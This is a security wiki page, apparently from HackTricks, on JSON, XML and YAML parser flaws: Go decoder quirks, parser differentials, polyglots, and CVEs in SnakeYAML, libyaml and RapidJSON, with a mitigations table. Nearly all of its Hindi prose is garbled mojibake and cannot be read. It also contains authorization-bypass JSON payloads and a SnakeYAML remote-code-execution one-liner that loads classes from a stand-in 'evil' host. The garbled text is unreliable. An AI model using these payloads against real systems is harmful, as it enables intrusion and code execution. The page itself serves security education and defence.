# JSON, XML & Yaml Hacking & Issues

{{#include ../banners/hacktricks-training.md}}

## Go JSON Decoder

Go JSON рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рдорд╕реНрдпрд╛рдПрдБ рдкрд╛рдИ рдЧрдИрдВ, рд╣рд╛рд▓рд╛рдБрдХрд┐ рдпреЗ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рднреА рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддреА рд╣реИрдВред рдпреЗ рд╕рдорд╕реНрдпрд╛рдПрдБ [**рдЗрд╕ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ**](https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers/) рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХреА рдЧрдИ рдереАрдВред

Go рдХреЗ JSON, XML, рдФрд░ YAML рдкрд╛рд░реНрд╕рд░реНрд╕ рдореЗрдВ рдЕрд╕рдВрдЧрддрд┐рдпреЛрдВ рдФрд░ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдбрд┐рдлрд╝реЙрд▓реНрдЯреНрд╕ рдХреА рдПрдХ рд▓рдВрдмреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ**, **рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ**, рдпрд╛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдбреЗрдЯрд╛ рдХреЛ рдПрдХреНрд╕рдлрд┐рд▓реНрдЯреНрд░реЗрдЯ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### (Un)Marshaling Unexpected Data

рдЙрджреНрджреЗрд╢реНрдп рдЙрди рд╕реНрдЯреНрд░рдХреНрдЪрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлрд╝реАрд▓реНрдб (рдЬреИрд╕реЗ, `IsAdmin`, `Password`) рдХреЛ рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред

- Example Struct:
```go
type User struct {
Username string `json:"username,omitempty"`
Password string `json:"password,omitempty"`
IsAdmin  bool   `json:"-"`
}
```
- рд╕рд╛рдорд╛рдиреНрдп рдХрдордЬреЛрд░рд┐рдпрд╛рдБ

1. **рдЧрд╛рдпрдм рдЯреИрдЧ** (рдХреЛрдИ рдЯреИрдЧ рдирд╣реАрдВ = рдлрд╝реАрд▓реНрдб рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрднреА рднреА рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ):
```go
type User struct {
Username string
}
```
рдкреЗрд▓реЛрдб:
```json
{"Username": "admin"}
```
2. **`-` рдХрд╛ рдЧрд▓рдд рдЙрдкрдпреЛрдЧ**:
```go
type User struct {
IsAdmin bool `json:"-,omitempty"` // тЭМ wrong
}
```
рдкреЗрд▓реЛрдб:
```json
{"-": true}
```
тЬФя╕П рдлрд╝реАрд▓реНрдб рдХреЛ (рдЕрди)рдорд╛рд░реНрд╢рд▓ рд╣реЛрдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХрд╛ рд╕рд╣реА рддрд░реАрдХрд╛:
```go
type User struct {
IsAdmin bool `json:"-"`
}
```
### Parser Differentials

рдЙрджреНрджреЗрд╢реНрдп рдпрд╣ рд╣реИ рдХрд┐ рд╡рд┐рднрд┐рдиреНрди рдкрд╛рд░реНрд╕рд░реНрд╕ рдХреИрд╕реЗ рд╕рдорд╛рди рдкреЗрд▓реЛрдб рдХреЛ рдЕрд▓рдЧ-рдЕрд▓рдЧ рддрд░реАрдХреЗ рд╕реЗ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░рддреЗ рд╣реИрдВ, рдЗрд╕рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдХрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЬреИрд╕реЗ рдХрд┐:
- CVE-2017-12635: Apache CouchDB рдмрд╛рдпрдкрд╛рд╕ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдХреАрдЬрд╝ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ
- 2022: Zoom 0-click RCE XML рдкрд╛рд░реНрд╕рд░ рдЕрд╕рдВрдЧрддрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ
- GitLab 2025 SAML рдмрд╛рдпрдкрд╛рд╕ XML рд╡рд┐рд╢реЗрд╖рддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**1. Duplicate Fields:**
Go рдХрд╛ `encoding/json` **рдЕрдВрддрд┐рдо** рдлрд╝реАрд▓реНрдб рд▓реЗрддрд╛ рд╣реИред
```go
json.Unmarshal([]byte(`{"action":"UserAction", "action":"AdminAction"}`), &req)
fmt.Println(req.Action) // AdminAction
```
рдЕрдиреНрдп рдкрд╛рд░реНрд╕рд░ (рдЬреИрд╕реЗ, Java рдХрд╛ Jackson) **рдкрд╣рд▓рд╛** рд▓реЗ рд╕рдХрддреЗ рд╣реИрдВред

**2. рдХреЗрд╕ рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛:**
Go рдХреЗрд╕-рдЕрд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ:
```go
json.Unmarshal([]byte(`{"AcTiOn":"AdminAction"}`), &req)
// matches `Action` field
```
рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдпреВрдирд┐рдХреЛрдб рдЯреНрд░рд┐рдХреНрд╕ рднреА рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ:
```go
json.Unmarshal([]byte(`{"aтДкtion┼┐": "bypass"}`), &req)
```
**3. рдХреНрд░реЙрд╕-рд╕реЗрд╡рд╛ рдЕрд╕рдВрдЧрддрд┐:**
рдХрд▓реНрдкрдирд╛ рдХрд░реЗрдВ:
- Go рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ рдкреНрд░реЙрдХреНрд╕реА
- Python рдореЗрдВ рд▓рд┐рдЦрд╛ рдЧрдпрд╛ AuthZ рд╕реЗрд╡рд╛

рд╣рдорд▓рд╛рд╡рд░ рднреЗрдЬрддрд╛ рд╣реИ:
```json
{
"action": "UserAction",
"AcTiOn": "AdminAction"
}
```
- Python `UserAction` рдХреЛ рджреЗрдЦрддрд╛ рд╣реИ, рдЗрд╕реЗ рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ
- Go `AdminAction` рдХреЛ рджреЗрдЦрддрд╛ рд╣реИ, рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ


### рдбреЗрдЯрд╛ рдлрд╝реЙрд░реНрдореЗрдЯ рднреНрд░рдо (Polyglots)

рд▓рдХреНрд╖реНрдп рдЙрди рд╕рд┐рд╕реНрдЯрдореЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛ рд╣реИ рдЬреЛ рдлрд╝реЙрд░реНрдореЗрдЯ (JSON/XML/YAML) рдХреЛ рдорд┐рд▓рд╛рддреЗ рд╣реИрдВ рдпрд╛ рдкрд╛рд░реНрд╕рд░ рддреНрд░реБрдЯрд┐рдпреЛрдВ рдкрд░ рдЦреБрд▓рд╛ рдЫреЛрдбрд╝ рджреЗрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ:
- **CVE-2020-16250**: HashiCorp Vault рдиреЗ JSON рдХреЛ XML рдкрд╛рд░реНрд╕рд░ рдХреЗ рд╕рд╛рде рдкрд╛рд░реНрд╕ рдХрд┐рдпрд╛ рдЬрдм STS рдиреЗ XML рдХреЗ рдмрдЬрд╛рдп JSON рд▓реМрдЯрд╛рдпрд╛ред

рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ:
- `Accept: application/json` рд╣реЗрдбрд░
- JSON рдмреЙрдбреА рдХрд╛ рдЖрдВрд╢рд┐рдХ рдирд┐рдпрдВрддреНрд░рдг

Go рдХрд╛ XML рдкрд╛рд░реНрд╕рд░ рдЗрд╕реЗ **рдлрд┐рд░ рднреА** рдкрд╛рд░реНрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрдВрдЬреЗрдХреНрдЯ рдХреА рдЧрдИ рдкрд╣рдЪрд╛рди рдкрд░ рднрд░реЛрд╕рд╛ рдХрд░рддрд╛ рд╣реИред

- рддреИрдпрд╛рд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреЗрд▓реЛрдб:
```json
{
"action": "Action_1",
"AcTiOn": "Action_2",
"ignored": "<?xml version=\"1.0\"?><Action>Action_3</Action>"
}
```
Result:
- **Go JSON** parser: `Action_2` (case-insensitive + last wins)
- **YAML** parser: `Action_1` (case-sensitive)
- **XML** parser: parses `"Action_3"` inside the string

---

## рдЙрд▓реНрд▓реЗрдЦрдиреАрдп рдкрд╛рд░реНрд╕рд░ рдХрдордЬреЛрд░рд┐рдпрд╛рдБ (2023-2025)

> рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рд░реВрдк рд╕реЗ рд╢реЛрд╖рдг рдпреЛрдЧреНрдп рдореБрджреНрджреЗ рджрд┐рдЦрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдкрд╛рд░реНрд╕рд┐рдВрдЧ рдПрдХ рдмрд╣реБ-рднрд╛рд╖рд╛ рд╕рдорд╕реНрдпрд╛ рд╣реИ тАФ рдХреЗрд╡рд▓ рдПрдХ Go рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВред

### SnakeYAML рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди RCE (CVE-2022-1471)

* рдкреНрд░рднрд╛рд╡рд┐рдд: `org.yaml:snakeyaml` < **2.0** (Spring-Boot, Jenkins, рдЖрджрд┐ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ)ред
* рдореВрд▓ рдХрд╛рд░рдг: `new Constructor()` **рдордирдорд╛рдиреЗ Java рдХреНрд▓рд╛рд╕реЗрд╕** рдХреЛ рдбреАрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЧреИрдЬреЗрдЯ рд╢реНрд░реГрдВрдЦрд▓рд╛рдПрдБ рдмрдирддреА рд╣реИрдВ рдЬреЛ рджреВрд░рд╕реНрде рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрддреА рд╣реИрдВред
* One-liner PoC (рдХрдордЬреЛрд░ рд╣реЛрд╕реНрдЯ рдкрд░ рдХреИрд▓рдХреБрд▓реЗрдЯрд░ рдЦреЛрд▓реЗрдЧрд╛):
```yaml
!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL ["http://evil/"] ] ] ]
```
* Fix / Mitigation:
1. **тЙе2.0 рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ** (рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `SafeLoader` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ)ред
2. рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдкрд░, рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ `new Yaml(new SafeConstructor())` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

### libyaml Double-Free (CVE-2024-35325)

* рдкреНрд░рднрд╛рд╡рд┐рдд: `libyaml` тЙд0.2.5 (рдХрдИ рднрд╛рд╖рд╛ рдмрд╛рдЗрдВрдбрд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА C рд▓рд╛рдЗрдмреНрд░реЗрд░реА)ред
* рд╕рдорд╕реНрдпрд╛: `yaml_event_delete()` рдХреЛ рджреЛ рдмрд╛рд░ рдХреЙрд▓ рдХрд░рдиреЗ рд╕реЗ рдбрдмрд▓-рдлреНрд░реА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рд╣рдорд▓рд╛рд╡рд░ DoS рдореЗрдВ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдХреБрдЫ рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ heap рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
* рд╕реНрдерд┐рддрд┐: рдЕрдкрд╕реНрдЯреНрд░реАрдо рдиреЗ тАЬAPI misuseтАЭ рдХреЗ рд░реВрдк рдореЗрдВ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛, рд▓реЗрдХрд┐рди Linux рд╡рд┐рддрд░рдгреЛрдВ рдиреЗ **0.2.6** рдкреИрдЪ рдХрд┐рдпрд╛ рдЬреЛ рдбрд┐рдлреЗрдВрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдирд▓-рдлреНрд░реА рдХрд░рддрд╛ рд╣реИред

### RapidJSON Integer (Under|Over)-flow (CVE-2024-38517 / CVE-2024-39684)

* рдкреНрд░рднрд╛рд╡рд┐рдд: Tencent **RapidJSON** рдХрдорд┐рдЯ `8269bc2` рд╕реЗ рдкрд╣рд▓реЗ (<1.1.0-patch-22)ред
* рдмрдЧ: `GenericReader::ParseNumber()` рдореЗрдВ рдЕрдирдЪреЗрдХреНрдб рдЕрдВрдХрдЧрдгрд┐рдд рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рд╡рд┐рд╢рд╛рд▓ рд╕рдВрдЦреНрдпрд╛рддреНрдордХ рд▓рд┐рдЯреЗрд░рд▓ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдЬреЛ рд▓рдкреЗрдЯрддреЗ рд╣реИрдВ рдФрд░ heap рдХреЛ рднреНрд░рд╖реНрдЯ рдХрд░рддреЗ рд╣реИрдВ тАФ рдЕрдВрддрддрдГ рдкреНрд░рд┐рд╡рд┐рд▓реЗрдЬ-рдПрд╕реНрдХреЗрд▓реЗрд╢рди рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддреЗ рд╣реИрдВ рдЬрдм рдкрд░рд┐рдгрд╛рдореА рдСрдмреНрдЬреЗрдХреНрдЯ рдЧреНрд░рд╛рдл рдХреЛ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдирд┐рд░реНрдгрдпреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

---

### ЁЯФР Mitigations (Updated)

| рдЬреЛрдЦрд┐рдо                                | рд╕реБрдзрд╛рд░ / рд╕рд┐рдлрд╛рд░рд┐рд╢                                      |
|-------------------------------------|------------------------------------------------------------|
| рдЕрдЬреНрдЮрд╛рдд рдлрд╝реАрд▓реНрдб (JSON)               | `decoder.DisallowUnknownFields()`                          |
| рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдлрд╝реАрд▓реНрдб (JSON)             | тЭМ stdlib рдореЗрдВ рдХреЛрдИ рд╕реБрдзрд╛рд░ рдирд╣реАрдВ тАФ [`jsoncheck`](https://github.com/dvsekhvalnov/johnny-five) рдХреЗ рд╕рд╛рде рдорд╛рдиреНрдп рдХрд░реЗрдВ |
| рдХреЗрд╕-рдЗрдирд╕реЗрдВрд╕рд┐рдЯрд┐рд╡ рдореИрдЪ (Go)         | тЭМ рдХреЛрдИ рд╕реБрдзрд╛рд░ рдирд╣реАрдВ тАФ рд╕рдВрд░рдЪрдирд╛ рдЯреИрдЧ + рдкреВрд░реНрд╡-рдорд╛рдирдХреАрдХрд░рдг рдЗрдирдкреБрдЯ рдХреЛ рдорд╛рдиреНрдп рдХрд░реЗрдВ   |
| XML рдЧрд╛рд░реНрдмреЗрдЬ рдбреЗрдЯрд╛ / XXE              | рдПрдХ рд╣рд╛рд░реНрдбрди рдХрд┐рдП рдЧрдП рдкрд╛рд░реНрд╕рд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (`encoding/xml` + `DisallowDTD`)     |
| YAML рдЕрдЬреНрдЮрд╛рдд рдХреБрдВрдЬреА                   | `yaml.KnownFields(true)`                                   |
| **рдЕрд╕реБрд░рдХреНрд╖рд┐рдд YAML рдбреЗрд╕рд┐рд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди**     | SafeConstructor рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ / SnakeYAML тЙе2.0 рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ            |
| libyaml тЙд0.2.5 рдбрдмрд▓-рдлреНрд░реА          | **0.2.6** рдореЗрдВ рдЕрдкрдЧреНрд░реЗрдб рдХрд░реЗрдВ рдпрд╛ рдбрд┐рд╕реНрдЯреНрд░реАрдмреНрдпреВрд╢рди-рдкреИрдЪ рд░рд┐рд▓реАрдЬ рдХрд░реЗрдВ            |
| RapidJSON <рдкреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХрдорд┐рдЯ           | рдирд╡реАрдирддрдо RapidJSON (тЙердЬреБрд▓рд╛рдИ 2024) рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕рдВрдХрд▓рд┐рдд рдХрд░реЗрдВ              |

## References

- Baeldung тАУ тАЬResolving CVE-2022-1471 With SnakeYAML 2.0тАЭ
- Ubuntu Security Tracker тАУ CVE-2024-35325 (libyaml)

{{#include ../banners/hacktricks-training.md}}
